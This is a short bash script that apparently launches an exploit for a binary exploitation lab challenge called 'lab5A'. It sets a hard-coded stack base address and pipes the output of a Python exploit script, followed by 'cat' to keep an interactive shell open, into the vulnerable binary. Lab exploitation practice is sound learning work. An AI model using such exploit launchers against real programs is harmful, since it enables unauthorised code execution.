#!/bin/bash

# Stack's base is to be set by reading:
#	read
#	index: -10
# -10th element and interpreting it into HEX base.
STACK_BASE=0xbffff448

echo Please configure your\'s STACK_BASE address!
(python /tmp/lab5a/exp5a.py $STACK_BASE ; cat ) | ./lab5A
